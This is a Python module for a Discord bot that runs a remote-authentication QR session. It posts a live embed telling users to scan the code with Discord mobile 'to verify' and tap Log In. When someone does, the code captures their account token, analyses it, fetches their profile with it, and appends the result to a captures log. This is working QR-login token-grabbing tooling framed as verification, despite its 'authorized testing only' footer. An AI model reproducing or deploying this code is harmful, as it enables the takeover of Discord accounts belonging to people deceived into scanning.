"""Session management slash commands with live embed updates."""

from __future__ import annotations

import asyncio
import io
import json
import logging
import time
from datetime import datetime, timezone
from typing import Optional
from uuid import UUID

import discord
from discord import app_commands

from analysis.data_extraction import fetch_user_profile
from analysis.token_analysis import analyze_token
from config import settings
from interface.state import store
from research.protocol import ProtocolState, RemoteAuthSession
from research.qr_generator import generate_qr_bytes

logger = logging.getLogger(__name__)

REFRESH_INTERVAL_SECONDS = 5
QR_ROTATION_SECONDS = 120
COMPLETE_DELETE_DELAY_SECONDS = 3
QR_WAIT_TIMEOUT_SECONDS = 45.0

EMBED_TITLE = "🔐 Remote Auth Session"
EMBED_DESCRIPTION = (
    "**Scan with Discord mobile to verify**\n\n"
    "1. Open **Discord** on your phone\n"
    "2. Go to **User Settings → Scan QR Code**\n"
    "3. Scan the code below and tap **Log In**"
)

_active_controllers: dict[UUID, SessionEmbedController] = {}


async def stop_controller(session_id: UUID) -> None:
    """Stop a live embed controller if one exists for the session."""
    controller = _active_controllers.get(session_id)
    if controller:
        await controller.stop()


async def _ensure_enabled(interaction: discord.Interaction) -> bool:
    if store.enabled:
        return True
    await interaction.response.send_message(
        "Session creation is disabled",
        ephemeral=True,
    )
    return False


def _status_label(session: RemoteAuthSession) -> str:
    if session.state == ProtocolState.COMPLETED:
        return "✅ Complete"
    if session.state == ProtocolState.PENDING_TICKET:
        return "📱 Scanned — Confirm on phone"
    if session.state in {ProtocolState.CANCELLED, ProtocolState.ERROR}:
        return f"❌ {session.error or session.state.value}"
    if session.state == ProtocolState.EXPIRED or session.seconds_remaining() <= 0:
        return "⏰ Expired"
    if session.state in {
        ProtocolState.CONNECTING,
        ProtocolState.HANDSHAKING,
        ProtocolState.READY,
        ProtocolState.AWAITING_SCAN,
    }:
        return "🔄 Awaiting Scan"
    return f"ℹ️ {session.state.value}"


def _embed_color(session: RemoteAuthSession) -> discord.Color:
    if session.state == ProtocolState.COMPLETED:
        return discord.Color.green()
    if session.state == ProtocolState.PENDING_TICKET:
        return discord.Color.gold()
    if session.state in {ProtocolState.EXPIRED, ProtocolState.ERROR, ProtocolState.CANCELLED}:
        return discord.Color.red()
    return discord.Color.blurple()


def build_session_embed(session: RemoteAuthSession, generation: int) -> discord.Embed:
    """Build the live session embed with status, timer, and session ID fields."""
    embed = discord.Embed(
        title=EMBED_TITLE,
        description=EMBED_DESCRIPTION,
        color=_embed_color(session),
        timestamp=datetime.now(timezone.utc),
    )
    embed.add_field(name="Status", value=_status_label(session), inline=True)
    embed.add_field(name="Timer", value=f"⏰ Expires in {session.seconds_remaining()}s", inline=True)
    embed.add_field(name="Session ID", value=f"`{session.session_id}`", inline=False)

    if session.user_preview:
        embed.add_field(
            name="Scanned User",
            value=f"**{session.user_preview.username}** (`{session.user_preview.user_id}`)",
            inline=False,
        )

    if session.fingerprint:
        embed.set_image(url="attachment://qr.png")

    embed.set_footer(text=f"Research session · QR gen #{generation} · Authorized testing only")
    return embed


def _qr_file(qr_png: bytes) -> discord.File:
    return discord.File(io.BytesIO(qr_png), filename="qr.png")


async def _persist_capture(session: RemoteAuthSession) -> None:
    if not session.token:
        return

    settings.output_dir.mkdir(parents=True, exist_ok=True)
    analysis = analyze_token(session.token)
    entry: dict[str, object] = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "session_id": str(session.session_id),
        "fingerprint": session.fingerprint,
        "token_analysis": analysis.to_dict(),
    }

    try:
        profile = await fetch_user_profile(session.token)
        entry["profile"] = profile.to_dict()
    except Exception as exc:
        logger.warning("Profile extraction failed for %s: %s", session.session_id, exc)
        entry["profile_error"] = str(exc)

    log_path = settings.output_dir / "captures.log"
    with log_path.open("a", encoding="utf-8") as handle:
        handle.write(json.dumps(entry) + "\n")

    logger.info("Persisted capture for session %s", session.session_id)


class SessionResetView(discord.ui.View):
    """Reset button — starts a fresh gateway handshake for the same session ID."""

    def __init__(self, controller: SessionEmbedController) -> None:
        super().__init__(timeout=None)
        self.controller = controller

    @discord.ui.button(label="Reset", emoji="🔄", style=discord.ButtonStyle.secondary)
    async def reset_button(
        self,
        interaction: discord.Interaction,
        _button: discord.ui.Button,
    ) -> None:
        if interaction.user.id != self.controller.owner_id and interaction.user.id not in settings.admin_user_ids:
            await interaction.response.send_message(
                "Only the session owner or an admin can reset this session.",
                ephemeral=True,
            )
            return

        await interaction.response.defer()
        try:
            await self.controller.refresh_handshake(force=True)
            await interaction.followup.send("Session reset — new QR code generated.", ephemeral=True)
        except Exception as exc:
            logger.exception("Reset failed for session %s", self.controller.session_id)
            await interaction.followup.send(f"Reset failed: {exc}", ephemeral=True)


class SessionEmbedController:
    """Manages a live Discord embed that tracks one remote auth protocol session."""

    def __init__(
        self,
        *,
        session_id: UUID,
        message: discord.Message,
        owner_id: int,
    ) -> None:
        self.session_id = session_id
        self.message = message
        self.owner_id = owner_id
        self.view = SessionResetView(self)
        self._task: Optional[asyncio.Task[None]] = None
        self._last_generation = -1
        self._last_handshake_monotonic = time.monotonic()
        self._stopped = False

    async def on_complete(self, session: RemoteAuthSession) -> None:
        await _persist_capture(session)

    async def start(self) -> None:
        record = await store.get(self.session_id)
        if record:
            record.embed_active = True

        await store.start_protocol(self.session_id, on_complete=self.on_complete)
        self._task = asyncio.create_task(self._refresh_loop())
        _active_controllers[self.session_id] = self

    async def stop(self, *, delete_message: bool = False) -> None:
        self._stopped = True
        if self._task and not self._task.done():
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass

        record = await store.get(self.session_id)
        if record:
            record.embed_active = False

        _active_controllers.pop(self.session_id, None)

        if delete_message:
            try:
                await self.message.delete()
            except discord.HTTPException:
                logger.debug("Could not delete session message %s", self.message.id)

    async def refresh_handshake(self, *, force: bool = False) -> None:
        record = await store.get(self.session_id)
        if not record:
            raise RuntimeError("Session no longer exists")

        if not force and record.session.state not in {
            ProtocolState.AWAITING_SCAN,
            ProtocolState.CONNECTING,
            ProtocolState.HANDSHAKING,
        }:
            return

        await store.restart_protocol(self.session_id, on_complete=self.on_complete)
        self._last_handshake_monotonic = time.monotonic()
        await store.wait_for_qr(self.session_id, timeout=QR_WAIT_TIMEOUT_SECONDS)
        await self._edit_embed(force_qr=True)

    async def _refresh_loop(self) -> None:
        try:
            while not self._stopped:
                record = await store.get(self.session_id)
                if not record:
                    break

                session = record.session
                now = time.monotonic()

                if (
                    session.state == ProtocolState.AWAITING_SCAN
                    and now - self._last_handshake_monotonic >= QR_ROTATION_SECONDS
                ):
                    try:
                        await self.refresh_handshake(force=True)
                    except Exception:
                        logger.exception("Scheduled QR rotation failed")

                if session.seconds_remaining() <= 0 and session.state == ProtocolState.AWAITING_SCAN:
                    session.state = ProtocolState.EXPIRED
                    session.error = "QR code expired"

                await self._edit_embed(force_qr=record.generation != self._last_generation)

                if session.state == ProtocolState.COMPLETED:
                    await self._edit_embed(force_qr=False)
                    await asyncio.sleep(COMPLETE_DELETE_DELAY_SECONDS)
                    await self.stop(delete_message=True)
                    return

                if session.state in {
                    ProtocolState.EXPIRED,
                    ProtocolState.CANCELLED,
                    ProtocolState.ERROR,
                }:
                    await self._edit_embed(force_qr=False)
                    return

                await asyncio.sleep(REFRESH_INTERVAL_SECONDS)
        except asyncio.CancelledError:
            raise
        except Exception:
            logger.exception("Embed refresh loop crashed for session %s", self.session_id)
        finally:
            record = await store.get(self.session_id)
            if record:
                record.embed_active = False
            _active_controllers.pop(self.session_id, None)

    async def _edit_embed(self, *, force_qr: bool) -> None:
        record = await store.get(self.session_id)
        if not record:
            return

        session = record.session

        if record.session.fingerprint and (force_qr or not record.qr_png):
            record.qr_png = generate_qr_bytes(record.session.fingerprint)

        embed = build_session_embed(session, record.generation)
        attachments: list[discord.File] = []

        if record.qr_png and session.fingerprint:
            attachments.append(_qr_file(record.qr_png))
            self._last_generation = record.generation

        try:
            if attachments:
                await self.message.edit(embed=embed, attachments=attachments, view=self.view)
            else:
                await self.message.edit(embed=embed, attachments=[], view=self.view)
        except discord.NotFound:
            self._stopped = True
        except discord.HTTPException as exc:
            logger.warning("Failed to edit session embed: %s", exc)


async def _launch_session_embed(interaction: discord.Interaction) -> None:
    session = await store.create_session(
        owner_id=interaction.user.id,
        owner_name=str(interaction.user),
    )
    record = await store.get(session.session_id)
    if not record:
        raise RuntimeError("Failed to create session record")

    placeholder = discord.Embed(
        title=EMBED_TITLE,
        description="Connecting to remote auth gateway…",
        color=discord.Color.blurple(),
    )
    placeholder.add_field(name="Status", value="🔄 Awaiting Scan", inline=True)
    placeholder.add_field(name="Timer", value=f"⏰ Expires in {settings.session_ttl_seconds}s", inline=True)
    placeholder.add_field(name="Session ID", value=f"`{session.session_id}`", inline=False)

    message = await interaction.followup.send(
        embed=placeholder,
        wait=True,
    )

    controller = SessionEmbedController(
        session_id=session.session_id,
        message=message,
        owner_id=interaction.user.id,
    )

    await controller.start()

    try:
        await store.wait_for_qr(session.session_id, timeout=QR_WAIT_TIMEOUT_SECONDS)
    except TimeoutError as exc:
        await controller.stop()
        session.state = ProtocolState.ERROR
        session.error = str(exc)
        await message.edit(
            embed=build_session_embed(session, record.generation),
            attachments=[],
            view=None,
        )
        raise

    await controller._edit_embed(force_qr=True)


class SessionCommands(app_commands.Group):
    """Commands for starting and inspecting remote auth test sessions."""

    def __init__(self) -> None:
        super().__init__(name="session", description="Manage remote auth research sessions")

    @app_commands.command(name="start", description="Start a live remote auth session with QR embed")
    async def start(self, interaction: discord.Interaction) -> None:
        if not await _ensure_enabled(interaction):
            return

        await interaction.response.defer(thinking=True)

        try:
            await _launch_session_embed(interaction)
            logger.info("User %s started live session embed", interaction.user.id)
        except Exception as exc:
            logger.exception("Failed to start session embed")
            await interaction.followup.send(f"Failed to start session: {exc}", ephemeral=True)

    @app_commands.command(name="status", description="Check the status of a test session")
    @app_commands.describe(session_id="UUID of the session to inspect")
    async def status(self, interaction: discord.Interaction, session_id: str) -> None:
        if interaction.user.id not in settings.admin_user_ids:
            await interaction.response.send_message("Admin access required.", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)

        try:
            sid = UUID(session_id)
        except ValueError:
            await interaction.followup.send("Invalid session UUID.", ephemeral=True)
            return

        record = await store.get(sid)
        if not record:
            await interaction.followup.send("Session not found.", ephemeral=True)
            return

        session = record.session
        embed = build_session_embed(session, record.generation)
        if record.qr_png:
            await interaction.followup.send(
                embed=embed,
                file=_qr_file(record.qr_png),
                ephemeral=True,
            )
        else:
            await interaction.followup.send(embed=embed, ephemeral=True)


async def setup(bot: discord.Client) -> SessionCommands:
    group = SessionCommands()
    bot.tree.add_command(group)
    return group
